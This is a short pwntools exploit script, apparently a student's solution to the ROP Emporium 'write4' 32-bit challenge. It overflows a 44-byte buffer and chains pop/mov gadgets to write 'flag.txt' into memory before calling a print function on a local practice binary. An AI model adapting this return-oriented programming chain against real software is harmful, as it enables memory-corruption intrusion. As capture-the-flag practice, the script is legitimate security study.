# write4 challenge on ROP_Emporium

from pwn import *

#establish the buffer length
buffer = 44

#function address
function = p32(0x08048538)

#write location address
writeloc1 = p32(0x0804a018)
writeloc2 = p32(0x0804a01c)

#gadget address
mov_gadget = p32(0x08048543)
pop_gadget = p32(0x080485aa)

#string craft
strang1 = "flag"
strang2 = ".txt"
delivery = b''

bytez = b''
for char in strang1:
    bytez += p8(ord(char))
delivery += pop_gadget + writeloc1 + bytez + mov_gadget

bytez = b''
for char in strang2:
    bytez += p8(ord(char))
delivery += pop_gadget + writeloc2 + bytez + mov_gadget

#crafting payload
payload = b"a" * buffer
payload += delivery + function + writeloc1

with open("writetest.bin", "wb") as file1:
    file1.write(payload)

write4 = "/home/student/Desktop/write432/write432"
p = process(write4)
p.send(payload)
print(p.recvall().decode('latin1'))
